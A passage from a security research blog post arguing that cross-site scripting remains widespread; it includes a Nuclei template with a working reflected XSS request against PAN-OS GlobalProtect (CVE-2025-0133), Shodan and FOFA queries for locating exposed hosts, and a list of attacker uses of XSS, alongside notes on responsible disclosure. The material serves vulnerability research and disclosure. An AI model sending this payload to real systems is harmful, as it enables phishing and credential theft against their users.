+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id: CVE-2025-0133
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">info:
+</span></span><span class="line"><span class="cl">  name: PAN-OS - Reflected Cross-Site Scripting
+</span></span><span class="line"><span class="cl">  author: xbow,DhiyaneshDK
+</span></span><span class="line"><span class="cl">  severity: medium
+</span></span><span class="line"><span class="cl">  description: <span class="p">|</span>
+</span></span><span class="line"><span class="cl">    A reflected cross-site scripting <span class="o">(</span>XSS<span class="o">)</span> vulnerability in the GlobalProtect™ gateway and portal features of Palo Alto Networks PAN-OS® software enables execution of malicious JavaScript in the context of an authenticated Captive Portal user<span class="s1">&#39;s browser when they click on a specially crafted link.The primary risk is phishing attacks that can lead to credential theft—particularly if you enabled Clientless VPN.
+</span></span></span><span class="line"><span class="cl"><span class="s1">  reference:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    - https://security.paloaltonetworks.com/CVE-2025-0133
+</span></span></span><span class="line"><span class="cl"><span class="s1">    - https://hackerone.com/reports/3096384
+</span></span></span><span class="line"><span class="cl"><span class="s1">  classification:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    epss-score: 0.00102
+</span></span></span><span class="line"><span class="cl"><span class="s1">    epss-percentile: 0.29276
+</span></span></span><span class="line"><span class="cl"><span class="s1">  metadata:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    verified: true
+</span></span></span><span class="line"><span class="cl"><span class="s1">    max-request: 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    shodan-query:
+</span></span></span><span class="line"><span class="cl"><span class="s1">      - http.favicon.hash:&#34;-631559155&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">      - cpe:&#34;cpe:2.3:o:paloaltonetworks:pan-os&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    fofa-query: icon_hash=&#34;-631559155&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    product: pan-os
+</span></span></span><span class="line"><span class="cl"><span class="s1">    vendor: paloaltonetworks
+</span></span></span><span class="line"><span class="cl"><span class="s1">  tags: hackerone,cve,cve2025,xss,panos,global-protect
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">http:
+</span></span></span><span class="line"><span class="cl"><span class="s1">  - raw:
+</span></span></span><span class="line"><span class="cl"><span class="s1">      - |
+</span></span></span><span class="line"><span class="cl"><span class="s1">        GET /ssl-vpn/getconfig.esp?client-type=1&amp;protocol-version=p1&amp;app-version=3.0.1-10&amp;clientos=Linux&amp;os-version=linux-64&amp;hmac-algo=sha1%2Cmd5&amp;enc-algo=aes-128-cbc%2Caes-256-cbc&amp;authcookie=12cea70227d3aafbf25082fac1b6f51d&amp;portal=us-vpn-gw-N&amp;user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&amp;domain=%28empty_domain%29&amp;computer=computer HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Host: {{Hostname}}
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">    matchers-condition: and
+</span></span></span><span class="line"><span class="cl"><span class="s1">    matchers:
+</span></span></span><span class="line"><span class="cl"><span class="s1">      - type: word
+</span></span></span><span class="line"><span class="cl"><span class="s1">        part: body
+</span></span></span><span class="line"><span class="cl"><span class="s1">        words:
+</span></span></span><span class="line"><span class="cl"><span class="s1">          - &#39;</span>&lt;script&gt;prompt<span class="o">(</span><span class="s2">&#34;XSS&#34;</span><span class="o">)</span>&lt;/script&gt;<span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">          - &#39;</span>authentication cookie<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">        condition: and
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      - type: status
+</span></span><span class="line"><span class="cl">        status:
+</span></span><span class="line"><span class="cl">          - <span class="m">200</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># digest: 490a0046304402202037be3477c0e16d7bb7cfb9874bf1cb6894a1d8035d64115db72607a539a54502203a1dac9b97514abef71fdb6a73d681f64f788f43605f2235f1fbfd26f6ddac2c:922c64590222798bb761d5b6d8e72950</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p style="text-align: justify;">We obtained a significant number of vulnerable hosts. Next, we tried to identify, among these results, any hosts that had a public VDP, so that we could notify them of the vulnerability. This step is a bit complex to do manually, so we used artificial intelligence to cross-reference the domains extracted from <b><code>Shodan</code></b> with information available on the internet about companies that have bug bounty programs or open VDPs.</p>
+<p style="text-align: justify;">During this research, we found only two domains with public VDPs - one a large private sector company, the other a government agency. Both are based in the United States: one with a VDP hosted on BugCrowd and the other with a private VDP, accessible via email.</p>
+<p style="text-align: justify;">We reported both vulnerabilities to the companies responsibly.</p>
+<p><img src="/articles/xss-nao-esta-morto/image-4.png"
+	width="1477"
+	height="318"
+	srcset="/articles/xss-nao-esta-morto/image-4_hu_4ef3b501dfbf457c.png 480w, /articles/xss-nao-esta-morto/image-4_hu_b14be945089ea159.png 1024w"
+	loading="lazy"
+	
+		alt="POC of Reflected XSS on one of the identified targets"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="464"
+		data-flex-basis="1114px"
+	
+></p>
+<p><img src="/articles/xss-nao-esta-morto/image-5.png"
+	width="1324"
+	height="691"
+	srcset="/articles/xss-nao-esta-morto/image-5_hu_6322dbd059060c9c.png 480w, /articles/xss-nao-esta-morto/image-5_hu_9279a9a4ff7f61a6.png 1024w"
+	loading="lazy"
+	
+		alt="Responsible Disclosure via Bugcrowd"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="459px"
+	
+></p>
+<p style="text-align: justify;">It is important to note that the sample tested represents only a fraction of the systems exposed.</p>
+<h2 id="more-numbers"><strong>More numbers</strong>
+</h2><p style="text-align: justify;">If you're still not convinced by the amount of XSS we have out there, we can do another simple search in the <i>GitHub Advisory Database</i> where we get a return of over <b>31,611 XSS-related occurrences</b>.</p>
+<p><img src="/articles/xss-nao-esta-morto/image-6.png"
+	width="2692"
+	height="1404"
+	srcset="/articles/xss-nao-esta-morto/image-6_hu_8944e16afc8c1393.png 480w, /articles/xss-nao-esta-morto/image-6_hu_aa853c3ed0f5991.png 1024w"
+	loading="lazy"
+	
+		alt="XSS search on GitHub Advisory Database"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="460px"
+	
+></p>
+<p style="text-align: justify;">A search in the <b>CVE (Common Vulnerabilities and Exposures)</b> database also reveals a significant number of registered vulnerabilities related to XSS, demonstrating its recurrence in different systems, applications and contexts over the years.</p>
+<p><img src="/articles/xss-nao-esta-morto/image-7.png"
+	width="1096"
+	height="866"
+	srcset="/articles/xss-nao-esta-morto/image-7_hu_dacb254ef186816c.png 480w, /articles/xss-nao-esta-morto/image-7_hu_272a9901a5e54f76.png 1024w"
+	loading="lazy"
+	
+		alt="XSS search on MITRE"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="126"
+		data-flex-basis="303px"
+	
+></p>
+<p style="text-align: justify;">In addition, a search carried out on the <b>HackerOne</b> platform, widely recognized in the <i>Bug Bounty</i> ecosystem, results in a total of <b>2,225 public reports</b> involving Cross-Site Scripting vulnerabilities. This data reinforces not only the prevalence of XSS, but also the security community's continued interest in exploiting and reporting it, even in environments with high security standards.</p>
+<p><img src="/articles/xss-nao-esta-morto/image-8.png"
+	width="1178"
+	height="831"
+	srcset="/articles/xss-nao-esta-morto/image-8_hu_2eaf7efd23d706c8.png 480w, /articles/xss-nao-esta-morto/image-8_hu_c63b99d525b540c3.png 1024w"
+	loading="lazy"
+	
+		alt="XSS search on HackerOne"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="340px"
+	
+></p>
+<h2 id="what-can-you-do-with-an-xss-besides-alert1"><strong>What can you do with an XSS besides alert(1)?</strong>
+</h2><p style="text-align: justify;">The famous alert(1) is often the first example used to demonstrate an XSS flaw.  However, the real impacts of this vulnerability go far beyond a simple alert window. Below, we list some classic and well-known malicious actions that can be carried out by an attacker when exploiting a Cross-Site Scripting flaw:</p>
+<p style="text-align: justify;">
+  <ul>
+    <li><b>Cookie Theft</b>, (if the cookie is not protected with the HttpOnly flag);</li>
+    <li><b>Session Hijacking</b>, assuming the victim's identity in authenticated applications;</li>
+    <li><b>Keylogging</b>, capturing everything the user types on the compromised page;</li>
+    <li><b>Malicious Redirects</b> to fake pages, with the aim of applying scams;</li>
+    <li><b>Performing actions on behalf of the user</b>, such as sending messages, changing settings or deleting data;</li>
+    <li><b>Remote Code Execution</b>, although rare and depending on the specific context, it may be possible to gain remote access to the system from an XSS.</li>
+  </ul>
+</p>
+<p style="text-align: justify;">These examples show that even though XSS is an often underestimated vulnerability, it can have serious consequences, especially when exploited in applications with sensitive data or with a high level of privilege for the affected user.</p>
+<h2 id="conclusion"><strong>Conclusion</strong>
+</h2><p style="text-align: justify;">XSS is not dead, perhaps it has just been ignored in the face of new, more 'glamorous' threats. But its silent presence continues to offer an exploitable attack surface, often with critical impact.</p>
+<p style="text-align: justify;">Despite often being classified as a vulnerability of <i>medium</i> or even <i>low</i> severity, <b>XSS should not be underestimated</b>. <b>Its impact can be significant, especially when it involves stealing cookies, session hijacking or redirecting to malicious pages. And what's more dangerous: traditional protections are not always enough to prevent the user from being tricked into clicking on that phishing site that is using a legitimate URL with an XSS vulnerability</b>.</p>
+<p style="text-align: justify;">After all, XSS often depends on a single click, and in this scenario, <b>the weakest link is usually the user themselves</b>. It doesn't matter how robust your framework is or how well configured your WAF is: if the attacker manages to create a convincing malicious link, all it takes is one inattentive action by the victim for the attack to materialize.</p>
+<p style="text-align: justify;"><b>While we rely on frameworks and WAFs, the attacker relies on our carelessness and the user's curiosity.</b></p>
+<p>Despite often being classified as a vulnerability of <em>medium</em> or even <em>low</em> severity, <strong>XSS should not be underestimated</strong>. Its impact can be significant, especially when it involves stealing cookies, session hijacking or redirecting to malicious pages. And what&rsquo;s more dangerous: <strong>traditional protections are not always enough to prevent the user from being tricked into clicking on that phishing site that is using a legitimate URL with an XSS vulnerability.</strong></p>
+<p>After all, XSS often depends on a single click, and in this scenario, <strong>the weakest link is usually the user themselves</strong>. It doesn&rsquo;t matter how robust your framework is or how well configured your WAF is: if the attacker manages to create a convincing malicious link, all it takes is one inattentive action by the victim for the attack to materialize.</p>
+<p><strong>While we rely on frameworks and WAFs, the attacker relies on our carelessness and the user&rsquo;s curiosity.</strong></p>
+<p><img src="/articles/xss-nao-esta-morto/xss-is-not-dead.png"
+	width="1200"
+	height="600"
+	srcset="/articles/xss-nao-esta-morto/xss-is-not-dead_hu_f6aedbe45d16af84.png 480w, /articles/xss-nao-esta-morto/xss-is-not-dead_hu_f5fd8f4a58fac159.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<h2 id="written-by">Written by
+</h2><p><a class="link" href="https://www.linkedin.com/in/nmmorette"  target="_blank" rel="noopener"
+    ><img src="/assets/contributors/50x50/natan50x50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></a> <a class="link" href="https://www.linkedin.com/in/nmmorette"  target="_blank" rel="noopener"
+    >Natan Maia Morette</a></p>
+<h2 id="contributor">Contributor
+</h2><p><a class="link" href="https://www.linkedin.com/in/karina-gante/"  target="_blank" rel="noopener"
+    ><img src="/assets/contributors/50x50/karina50x50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></a> <a class="link" href="https://www.linkedin.com/in/karina-gante/"  target="_blank" rel="noopener"
+    >Karina Gante</a></p>
+<h2 id="partnership">Partnership
+</h2><p><a class="link" href="https://hacktiba.github.io/"  target="_blank" rel="noopener"
+    ><img src="/assets/partners/hacktiba60x60.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></a> This post was made in partnership with <strong><a class="link" href="https://hacktiba.github.io/"  target="_blank" rel="noopener"
+    >Hacktiba</a></strong> for Pulse 07.</p>
+<blockquote>
+<p><em>Por: <a class="link" href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters"  target="_blank" rel="noopener"
+    >CVE-Hunters</a></em></p>
+</blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/cve-hunters/">CVE-Hunters</a>
+        
+            <a href="/tags/xss/">XSS</a>
+        
+            <a href="/tags/vulnerability-research/">Vulnerability Research</a>
+        
+            <a href="/tags/web-application-security/">Web Application Security</a>
+        
+            <a href="/tags/responsible-disclosure/">Responsible Disclosure</a>
+        
+            <a href="/tags/open-source-vulnerabilities/">Open Source Vulnerabilities</a>
+        
+            <a href="/tags/security-tools-for-pentesters/">Security Tools for Pentesters</a>
+        
+            <a href="/tags/bug-bounty-tools/">Bug Bounty Tools</a>
+        
+            <a href="/tags/ethical-hacking/">Ethical Hacking</a>
+        
+            <a href="/tags/xss-detection/">XSS Detection</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/articles/discovery-of-51-cves---how-caido-helped-our-open-source-security-research/">
+        
+        
+            <div class="article-image">
+                <img src="/articles/discovery-of-51-cves---how-caido-helped-our-open-source-security-research/cve-hunters&#43;caido.b100b2c36c7b0eeb5464097615707945_hu_70cba4446104a0c6.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Discovery of 51 CVEs - How Caido Helped Our Open Source Security Research"
+                        
+                        data-hash="md5-sQCyw2x7DutUZAl2FXB5RQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Discovery of 51 CVEs - How Caido Helped Our Open Source Security Research</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/articles/cve-hunters---the-journey-of-aspiring-vulnerability-researchers/">
+        
+        
+            <div class="article-image">
+                <img src="/articles/cve-hunters---the-journey-of-aspiring-vulnerability-researchers/defcon33.2f259eebb06b8a739f10f6d58933baa9_hu_5cd4c1382b79c62b.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CVE-Hunters, The Journey of Aspiring Vulnerability Researchers"
+                        
+                        data-hash="md5-LyWe67BrinOfEPbViTO6qQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CVE-Hunters, The Journey of Aspiring Vulnerability Researchers</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2026 CVE-Hunters
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
